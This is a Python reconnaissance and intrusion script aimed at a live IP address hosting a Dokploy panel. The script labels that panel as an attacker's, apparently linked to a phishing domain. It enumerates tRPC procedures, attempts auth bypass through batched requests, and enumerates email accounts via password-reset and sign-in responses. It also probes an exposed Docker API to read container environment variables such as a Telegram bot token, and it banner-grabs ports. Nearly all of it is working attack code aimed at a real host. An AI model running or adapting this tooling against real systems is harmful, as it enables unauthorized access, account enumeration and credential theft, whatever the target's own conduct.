#!/usr/bin/env python3
"""
probe3_dokploy.py — Phase 3: Deep Dokploy panel enumeration

Target: http://188.166.36.41:3000/  (attacker's Dokploy PaaS panel)

Attack surface:
  A. tRPC procedure mass-enumeration — find any unauthenticated queries
  B. tRPC batch requests — bundle a public proc with private ones (auth-bypass attempt)
  C. Better Auth deep probe — provider discovery, email enumeration via forget-password,
     sign-in error-message analysis (user exists vs. not)
  D. Dokploy-specific paths — build manifest (all page routes + chunk names),
     swagger, setup, invitation pages
  E. Docker daemon direct probe — port 2375 (unauthenticated Docker API = jackpot:
     GET /containers/json returns all env vars including TELEGRAM_BOT_TOKEN)
  F. TCP banner grab — ports 2375, 2376, 5432, 6379, 27017, 9000, 3001, 9090, 22, etc.
  G. HTTP service scan on non-3000 ports (Portainer, Traefik dashboard, etc.)
  H. WebSocket upgrade probe — Dokploy real-time log streaming may skip auth middleware
  I. Next.js chunk extraction — download Dokploy JS bundles, grep for tRPC proc names

Results saved to: recon/phase3_dokploy.json
"""

import asyncio
import json
import re
import urllib.parse
from datetime import datetime, timezone
from typing import Any

import httpx

# ── targets ───────────────────────────────────────────────────────────────────
DOKPLOY = "http://188.166.36.41:3000"
DROPLET_IP = "188.166.36.41"
DOKPLOY_BID = "88EvmKYaqpt89OTUtSZnM"  # Dokploy's own Next.js build ID
OUTPUT = "recon/phase3_dokploy.json"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
BASE_HDR = {
    "User-Agent": UA,
    "Accept": "application/json, text/html, */*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}

results: list[dict] = []


# ── helpers ───────────────────────────────────────────────────────────────────
def ts() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S")


def log(msg: str) -> None:
    print(f"[{ts()}] {msg}", flush=True)


def is_interesting(status: int, body: str = "", location: str = "") -> bool:
    """Flag anything that isn't a plain 401/403/404/redirect-to-login."""
    if status in (401, 403, 404):
        return False
    if status in (307, 308) and "sign-in" in location.lower():
        return False
    return True


async def get(
    client: httpx.AsyncClient,
    url: str,
    label: str,
    extra: dict | None = None,
) -> dict:
    """GET helper — url may be full (http://…) or path-only."""
    full = url if url.startswith("http") else DOKPLOY + url
    hdrs = {**BASE_HDR, **(extra or {})}
    try:
        r = await client.get(full, headers=hdrs, follow_redirects=False, timeout=10)
        body = r.text[:1200]
        loc = r.headers.get("location", "")
        ct = r.headers.get("content-type", "")
        interesting = is_interesting(r.status_code, body, loc)
        rec = {
            "label": label,
            "method": "GET",
            "url": full,
            "status": r.status_code,
            "content_type": ct,
            "location": loc,
            "body": body,
            "interesting": interesting,
        }
        flag = "  *** INTERESTING ***" if interesting else ""
        log(f"GET  {full}  ->  {r.status_code}  {ct[:35]}{flag}")
        return rec
    except Exception as exc:
        log(f"GET  {full}  ->  ERROR  {exc}")
        return {"label": label, "url": full, "error": str(exc)}


async def post(
    client: httpx.AsyncClient,
    url: str,
    body_data: Any,
    label: str,
    extra: dict | None = None,
) -> dict:
    """POST helper — body_data may be dict/list (auto-serialised) or str."""
    full = url if url.startswith("http") else DOKPLOY + url
    hdrs = {**BASE_HDR, **(extra or {})}
    if isinstance(body_data, (dict, list)):
        content = json.dumps(body_data).encode()
        hdrs.setdefault("Content-Type", "application/json")
    else:
        content = body_data.encode()
    try:
        r = await client.post(
            full, content=content, headers=hdrs, follow_redirects=False, timeout=12
        )
        body = r.text[:1200]
        loc = r.headers.get("location", "")
        interesting = is_interesting(r.status_code, body, loc)
        rec = {
            "label": label,
            "method": "POST",
            "url": full,
            "status": r.status_code,
            "content_type": r.headers.get("content-type", ""),
            "body": body,
            "interesting": interesting,
        }
        flag = "  *** INTERESTING ***" if interesting else ""
        log(f"POST {full}  ->  {r.status_code}{flag}")
        return rec
    except Exception as exc:
        log(f"POST {full}  ->  ERROR  {exc}")
        return {"label": label, "url": full, "error": str(exc)}


async def tcp_probe(host: str, port: int) -> dict:
    """Async TCP connect + banner grab."""
    log(f"TCP  {host}:{port}  …")
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=4.0
        )
        try:
            raw = await asyncio.wait_for(reader.read(512), timeout=2.5)
            banner = raw.decode(errors="replace").strip()[:300]
        except asyncio.TimeoutError:
            banner = ""
        writer.close()
        log(f"TCP  {host}:{port}  ->  OPEN  banner={banner!r:.70}")
        return {"host": host, "port": port, "open": True, "banner": banner}
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError) as exc:
        log(f"TCP  {host}:{port}  ->  CLOSED  ({exc})")
        return {"host": host, "port": port, "open": False, "error": str(exc)}


def trpc_get_url(proc: str, input_val: Any = None) -> str:
    """Build a tRPC v10 GET query URL (with optional ?input=)."""
    if input_val is None:
        return f"/api/trpc/{proc}"
    encoded = urllib.parse.quote(json.dumps({"json": input_val}))
    return f"/api/trpc/{proc}?input={encoded}"


def trpc_batch_url(procs: list[str]) -> str:
    """Build a tRPC v10 batch GET URL for multiple procedures."""
    names = ",".join(procs)
    inp = {str(i): {"json": None} for i in range(len(procs))}
    encoded = urllib.parse.quote(json.dumps(inp))
    return f"/api/trpc/{names}?batch=1&input={encoded}"


# ── tRPC procedure catalogue (from Dokploy open-source code) ─────────────────
# Roughly ordered: public candidates first, then auth-gated categories
TRPC_PROCS = [
    # ── Confirmed public ──────────────────────────────────────────────────────
    "settings.isCloud",
    # ── Likely public (setup / onboarding flow) ───────────────────────────────
    "admin.isRegistered",
    "setup.isRunning",
    "setup.getStatus",
    "setup.get",
    # ── settings ──────────────────────────────────────────────────────────────
    "settings.getDokployVersion",
    "settings.getServerIp",
    "settings.getLetsEncryptEmail",
    "settings.getCertificateType",
    "settings.getDockerConfig",
    "settings.getDockerCleanup",
    "settings.getStoredPaymentConfig",
    "settings.getAllRegistries",
    "settings.getGitProviders",
    "settings.getServerInfo",
    "settings.all",
    # ── user ──────────────────────────────────────────────────────────────────
    "user.get",
    "user.all",
    "user.getPermissions",
    "user.byEmail",
    "user.isCurrentUser",
    "user.getSelfUser",
    # ── auth ──────────────────────────────────────────────────────────────────
    "auth.isRoot",
    "auth.get",
    "auth.getSelfUser",
    "auth.createAdmin",
    # ── project ───────────────────────────────────────────────────────────────
    "project.all",
    "project.getPublic",
    # ── application ───────────────────────────────────────────────────────────
    "application.all",
    "application.getDockerOptions",
    # ── compose / server ──────────────────────────────────────────────────────
    "compose.all",
    "server.all",
    "server.getDockerInfo",
    "server.getConfig",
    "server.getSystemInfo",
    # ── notification (the prize — Telegram token lives here) ─────────────────
    "notification.all",
    "notification.getChannels",
    "notification.one",
    # ── deployment ────────────────────────────────────────────────────────────
    "deployment.all",
    "deployment.getPublic",
    # ── certificate / domain ──────────────────────────────────────────────────
    "certificate.all",
    "domain.all",
    # ── monitoring ────────────────────────────────────────────────────────────
    "monitoring.get",
    "monitoring.getContainerStats",
    # ── backup / destination ──────────────────────────────────────────────────
    "backup.all",
    "destination.all",
    # ── invitation ────────────────────────────────────────────────────────────
    "invitation.all",
    "invitation.getPending",
    # ── audit ─────────────────────────────────────────────────────────────────
    "audit.all",
    "audit.getLogs",
    # ── registry / git provider ───────────────────────────────────────────────
    "registry.all",
    "gitProvider.all",
    # ── ai / traefik / security ───────────────────────────────────────────────
    "ai.getConfig",
    "traefik.getConfig",
    "traefik.getDynamic",
    "security.all",
    # ── databases ─────────────────────────────────────────────────────────────
    "redis.all",
    "mysql.all",
    "postgres.all",
    "mariadb.all",
    "mongo.all",
    # ── cluster / docker ──────────────────────────────────────────────────────
    "cluster.all",
    "cluster.getSwarmNodes",
    "cluster.getInfo",
    "docker.getContainers",
    "docker.getImages",
    "docker.getVolumes",
    "docker.getNetworks",
    "docker.getStats",
]

# ── email targets for Better Auth enumeration ─────────────────────────────────
TEST_EMAILS = [
    "admin@cibccaribbeanid.icu",
    "admin@localhost",
    "admin@admin.com",
    "root@localhost",
    "admin@dokploy.com",
    "dokploy@dokploy.com",
    "support@cibccaribbeanid.icu",
    "nonexistent_control_xyzzy@example.com",  # must not exist — baseline
]

# ── Docker API paths ──────────────────────────────────────────────────────────
DOCKER_PATHS = [
    "/",
    "/v1.41/_ping",
    "/v1.41/version",
    "/v1.41/info",
    "/v1.41/containers/json?all=true",  # all containers + config (env vars!)
    "/v1.41/images/json",
    "/v1.41/volumes",
    "/v1.41/networks",
    "/v1.41/swarm",
    "/v1.43/_ping",
    "/v1.43/info",
    "/v1.43/containers/json?all=true",
]

# ── Dokploy-specific page / static paths ─────────────────────────────────────
DOKPLOY_PATHS = [
    "/api/health",
    "/swagger",
    "/api/swagger.json",
    "/api/openapi.json",
    "/api/docs",
    "/api-docs",
    "/api/version",
    "/metrics",
    "/api/metrics",
    "/.well-known/security.txt",
    "/robots.txt",
    "/sitemap.xml",
    "/setup",
    "/api/setup",
    "/register",
    "/invitation",
    "/dashboard",
    "/dashboard/home",
    # Build manifest — reveals every page route and its chunk hashes
    f"/_next/static/{DOKPLOY_BID}/_buildManifest.js",
    f"/_next/static/{DOKPLOY_BID}/_ssgManifest.js",
    # Server manifests (usually 404 but occasionally served)
    "/_next/server/app-paths-manifest.json",
    "/_next/server/pages-manifest.json",
    "/_next/server/middleware-manifest.json",
    # Traefik dashboard (served by Traefik itself, typically port 8080 or /traefik)
    "/traefik",
    "/api/traefik",
]

# ── WebSocket upgrade targets ─────────────────────────────────────────────────
WS_UPGRADE_HDR = {
    "Upgrade": "websocket",
    "Connection": "Upgrade",
    "Sec-WebSocket-Version": "13",
    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
}
WS_PATHS = [
    "/api/deploy/logs",
    "/api/deployment/logs",
    "/api/logs",
    "/api/ws",
    "/ws",
    "/socket",
    "/socket.io",
    "/api/socket.io",
    "/trpc",  # tRPC websocket transport
]

# ── TCP ports to banner-grab ──────────────────────────────────────────────────
TCP_PORTS = [
    22,
    25,
    53,
    587,
    2375,
    2376,
    3001,
    4000,
    5000,
    5432,
    6379,
    8080,
    8888,
    9000,
    9090,
    9200,
    27017,
]

# ── HTTP ports to probe ───────────────────────────────────────────────────────
HTTP_PORT_TARGETS = [
    (2375, "/"),
    (2375, "/v1.41/_ping"),
    (2375, "/v1.41/info"),
    (2375, "/v1.41/containers/json?all=true"),
    (9000, "/"),
    (9000, "/api/status"),
    (3001, "/"),
    (4000, "/"),
    (5000, "/"),
    (9090, "/"),
    (9200, "/"),
    (8888, "/"),
]


# ── main ─────────────────────────────────────────────────────────────────────
async def run() -> None:

    async with httpx.AsyncClient(
        verify=False, follow_redirects=False, timeout=12
    ) as client:
        # ── A: tRPC procedure enumeration ─────────────────────────────────────
        log("\n=== Phase A: tRPC procedure enumeration ===")
        for proc in TRPC_PROCS:
            r = await get(client, trpc_get_url(proc), f"A_trpc_{proc}")
            results.append(r)
            await asyncio.sleep(0.18)

        # Also try with explicit null input (some procs need it to resolve)
        log("\n=== Phase A2: tRPC with explicit null input ===")
        interesting_procs = [
            "settings.isCloud",
            "admin.isRegistered",
            "setup.isRunning",
            "settings.getDokployVersion",
            "settings.getServerInfo",
            "notification.all",
            "project.all",
            "user.all",
            "audit.all",
            "docker.getContainers",
        ]
        for proc in interesting_procs:
            r = await get(client, trpc_get_url(proc, None), f"A2_trpc_null_{proc}")
            results.append(r)
            await asyncio.sleep(0.2)

        # ── B: tRPC batch requests (public + private bundled) ─────────────────
        log("\n=== Phase B: tRPC batch auth-bypass attempts ===")

        # Strategy: bundle settings.isCloud (known-public) with each high-value
        # private procedure.  tRPC v10 processes each in the batch independently,
        # but some server implementations apply the auth check only to the first
        # item or skip it when a public proc is co-batched.
        high_value = [
            "notification.all",
            "project.all",
            "user.all",
            "audit.all",
            "docker.getContainers",
            "deployment.all",
            "settings.getDokployVersion",
        ]
        for priv in high_value:
            url = trpc_batch_url(["settings.isCloud", priv])
            r = await get(client, url, f"B_batch_isCloud+{priv}")
            results.append(r)
            await asyncio.sleep(0.25)

        # Batch several private procs together (no public anchor)
        url = trpc_batch_url(
            ["notification.all", "project.all", "user.all", "audit.all"]
        )
        r = await get(client, url, "B_batch_private_multi")
        results.append(r)
        await asyncio.sleep(0.25)

        # ── C: Better Auth endpoint survey ────────────────────────────────────
        log("\n=== Phase C: Better Auth endpoints ===")
        ba_paths = [
            "/api/auth/get-session",
            "/api/auth/session",
            "/api/auth/list-sessions",
            "/api/auth/providers",
            "/api/auth/csrf",
            "/api/auth/.well-known/openid-configuration",
            "/api/auth/jwks",
            "/api/auth/user",
            "/api/auth/token",
            "/api/auth/userinfo",
            "/api/auth/sign-out",
            "/api/auth/callback/github",
            "/api/auth/callback/google",
            "/api/auth/verify-email",
            "/api/auth/magic-link",
            "/api/auth/passkey/authenticate",
        ]
        for path in ba_paths:
            r = await get(client, path, f"C_auth_{path.split('/')[-1]}")
            results.append(r)
            await asyncio.sleep(0.25)

        # C2: Email enumeration via forget-password
        # Better Auth returns a 200 regardless of whether the email exists,
        # but the response body or timing may differ.
        log("\n=== Phase C2: Email enumeration via forget-password ===")
        for email in TEST_EMAILS:
            slug = email.replace("@", "_at_").replace(".", "_")
            r = await post(
                client,
                "/api/auth/forget-password",
                {"email": email, "redirectTo": f"{DOKPLOY}/reset-password"},
                f"C2_forgot_{slug}",
            )
            results.append(r)
            await asyncio.sleep(0.55)  # slow down to avoid rate-limiting

        # C3: Sign-in error-message analysis (does "user not found" vs "bad password" differ?)
        log("\n=== Phase C3: Sign-in response analysis ===")
        for email in TEST_EMAILS:
            slug = email.replace("@", "_at_").replace(".", "_")
            r = await post(
                client,
                "/api/auth/sign-in/email",
                {
                    "email": email,
                    "password": "WrongP@ss!2024xyzzy",
                    "rememberMe": False,
                },
                f"C3_signin_{slug}",
            )
            results.append(r)
            await asyncio.sleep(0.55)

        # ── D: Dokploy page / static paths ────────────────────────────────────
        log("\n=== Phase D: Dokploy-specific paths ===")
        for path in DOKPLOY_PATHS:
            label = f"D_{path.split('/')[-1][:40] or 'root'}"
            r = await get(client, path, label)
            results.append(r)
            await asyncio.sleep(0.2)

        # ── E: Docker daemon HTTP API (port 2375) ─────────────────────────────
        log("\n=== Phase E: Docker API direct (port 2375) ===")
        for path in DOCKER_PATHS:
            url = f"http://{DROPLET_IP}:2375{path}"
            label = (
                f"E_docker_{path.split('?')[0].strip('/').replace('/', '_') or 'root'}"
            )
            r = await get(client, url, label)
            results.append(r)
            await asyncio.sleep(0.2)

        # ── G: HTTP probe on additional ports ─────────────────────────────────
        log("\n=== Phase G: HTTP scan on other ports ===")
        for port, path in HTTP_PORT_TARGETS:
            if port == 2375:
                continue  # already covered in phase E
            url = f"http://{DROPLET_IP}:{port}{path}"
            label = f"G_port{port}_{path.strip('/').replace('/', '_') or 'root'}"
            r = await get(client, url, label)
            results.append(r)
            await asyncio.sleep(0.25)

        # ── H: WebSocket upgrade probe ────────────────────────────────────────
        log("\n=== Phase H: WebSocket upgrade probe ===")
        for path in WS_PATHS:
            label = f"H_ws_{path.strip('/').replace('/', '_')}"
            r = await get(client, path, label, extra=WS_UPGRADE_HDR)
            results.append(r)
            await asyncio.sleep(0.25)

    # ── F: TCP banner grab (parallel, no HTTP client needed) ──────────────────
    log("\n=== Phase F: TCP banner grab ===")
    tcp_tasks = [tcp_probe(DROPLET_IP, p) for p in TCP_PORTS]
    tcp_raw = await asyncio.gather(*tcp_tasks)
    for tr in tcp_raw:
        results.append(
            {
                "phase": "F",
                "label": f"F_tcp_{tr['port']}",
                **tr,
                # Mark open TCP ports as interesting regardless of HTTP status
                "interesting": tr.get("open", False),
            }
        )

    # ── I: Dokploy JS chunk analysis ──────────────────────────────────────────
    # If the _buildManifest.js was retrieved in phase D, parse it now to extract
    # all chunk filenames, then fetch them and grep for tRPC procedure names.
    log("\n=== Phase I: JS chunk analysis ===")
    manifest_rec = next(
        (
            r
            for r in results
            if "_buildManifest" in r.get("url", "") and r.get("status") == 200
        ),
        None,
    )
    if manifest_rec:
        body_text = manifest_rec.get("body", "")
        # The build manifest embeds chunk hashes as an array inside a JS assignment.
        # Extract all hex-looking filenames.
        chunk_hashes = re.findall(r'"([0-9a-f]{16})"', body_text)
        log(f"  Build manifest found, extracted {len(chunk_hashes)} chunk hashes")

        async with httpx.AsyncClient(
            verify=False, follow_redirects=False, timeout=15
        ) as cc:
            seen = set()
            for h in chunk_hashes[:40]:  # cap at 40 to stay reasonable
                if h in seen:
                    continue
                seen.add(h)
                for candidate in [
                    f"/_next/static/chunks/{h}.js",
                    f"/_next/static/chunks/pages/{h}.js",
                ]:
                    r = await get(cc, candidate, f"I_chunk_{h}")
                    if r.get("status") == 200:
                        # Scan the chunk body for tRPC procedure strings
                        chunk_body = r.get("body", "")
                        procs_found = re.findall(
                            r'"([a-zA-Z][a-zA-Z0-9]*\.[a-zA-Z][a-zA-Z0-9]{3,30})"',
                            chunk_body,
                        )
                        # Filter to plausible tRPC names (camelCase.camelCase)
                        trpc_like = [
                            p
                            for p in procs_found
                            if any(
                                p.startswith(ns + ".")
                                for ns in [
                                    "notification",
                                    "project",
                                    "user",
                                    "settings",
                                    "application",
                                    "compose",
                                    "deployment",
                                    "server",
                                    "docker",
                                    "certificate",
                                    "domain",
                                    "registry",
                                    "gitProvider",
                                    "audit",
                                    "cluster",
                                    "backup",
                                    "destination",
                                    "invitation",
                                    "security",
                                    "traefik",
                                    "redis",
                                    "mysql",
                                    "postgres",
                                    "mariadb",
                                    "mongo",
                                    "monitoring",
                                    "ai",
                                    "admin",
                                    "auth",
                                    "setup",
                                ]
                            )
                        ]
                        if trpc_like:
                            r["trpc_procs_found"] = list(set(trpc_like))
                            r["interesting"] = True
                            log(f"  Chunk {h}: tRPC procs → {sorted(set(trpc_like))}")
                        results.append(r)
                        break
                    await asyncio.sleep(0.15)
    else:
        log(
            "  Build manifest not retrieved (expected 404 or auth-gated); skipping chunk analysis"
        )

    # ── save + summarise ──────────────────────────────────────────────────────
    with open(OUTPUT, "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2, ensure_ascii=False)

    interesting = [r for r in results if r.get("interesting")]
    log(f"\n✓ Saved {len(results)} results → {OUTPUT}")
    log(f"  Interesting (non-401/403/404): {len(interesting)}")

    if interesting:
        log("\n══ INTERESTING RESULTS ══════════════════════════════════════════")
        for r in interesting:
            status = r.get("status") or ("OPEN" if r.get("open") else "err")
            url = r.get("url") or r.get("label")
            snippet = (r.get("body") or r.get("banner") or "")[:200]
            log(f"  [{status}] {url}")
            if snippet:
                log(f"         → {snippet!r}")

    # ── quick findings summary ────────────────────────────────────────────────
    log("\n══ QUICK FINDINGS ═══════════════════════════════════════════════════")

    open_tcp = [r for r in results if r.get("phase") == "F" and r.get("open")]
    log(f"  Open TCP ports:  {[r['port'] for r in open_tcp]}")

    docker_hits = [
        r
        for r in results
        if "E_docker" in r.get("label", "") and r.get("status") == 200
    ]
    log(f"  Docker API (2375) endpoints responded 200: {len(docker_hits)}")
    for d in docker_hits:
        log(f"    {d['url']}  →  {d.get('body', '')[:120]!r}")

    auth_200 = [
        r
        for r in results
        if r.get("label", "").startswith("C") and r.get("status") == 200
    ]
    log(f"  Better Auth 200 responses: {len(auth_200)}")

    unauth_trpc = [
        r
        for r in results
        if r.get("label", "").startswith("A")
        and r.get("status") == 200
        and "isCloud" not in r.get("label", "")
    ]
    if unauth_trpc:
        log(f"  *** UNAUTHENTICATED tRPC PROCEDURES FOUND: {len(unauth_trpc)} ***")
        for r in unauth_trpc:
            log(f"    {r['label']}  →  {r.get('body', '')[:120]!r}")
    else:
        log("  No unexpected unauthenticated tRPC procedures found (yet)")

    manifest_hit = [
        r
        for r in results
        if "_buildManifest" in r.get("url", "") and r.get("status") == 200
    ]
    if manifest_hit:
        log(
            f"  *** BUILD MANIFEST RETRIEVED — check recon/phase3_dokploy.json for full chunk list ***"
        )


if __name__ == "__main__":
    asyncio.run(run())
